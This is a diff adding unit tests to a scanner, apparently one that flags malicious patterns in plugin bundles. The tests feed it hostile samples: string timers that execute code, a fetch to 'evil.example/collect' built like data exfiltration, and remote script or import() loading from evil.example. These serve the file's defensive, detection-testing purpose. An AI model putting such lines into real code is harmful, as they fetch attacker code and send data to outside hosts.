@@ -34,6 +34,27 @@ describe("scanPluginBundle", () => {
 		expect(report.flags.some((f) => f.id === "string-timer")).toBe(true);
 	});
 
+	it("flags template-literal string timers as HIGH too", () => {
+		const report = scanPluginBundle(
+			"setTimeout(`document.domain='evil'`, 100); setInterval(`x`, 50);",
+		);
+		expect(report.severity).toBe("high");
+		const timer = report.flags.find((f) => f.id === "string-timer");
+		expect(timer).toBeDefined();
+		expect(timer?.count).toBe(2);
+	});
+
+	it("flags protocol-relative network egress but not loopback", () => {
+		const report = scanPluginBundle(
+			`fetch("//evil.example/collect"); fetch("//127.0.0.1:34117/plugins/x");`,
+		);
+		expect(report.severity).toBe("medium");
+		const net = report.flags.find((f) => f.id === "network-apis");
+		expect(net).toBeDefined();
+		expect(net?.count).toBe(1);
+		expect(net?.evidence).toBe("//evil.example/collect");
+	});
+
 	it("flags dynamic <script> injection and remote import() as HIGH", () => {
 		const report = scanPluginBundle(
 			`const s = document.createElement("script"); s.src = "https://evil.example/x.js"; import("https://evil.example/y.js");`,
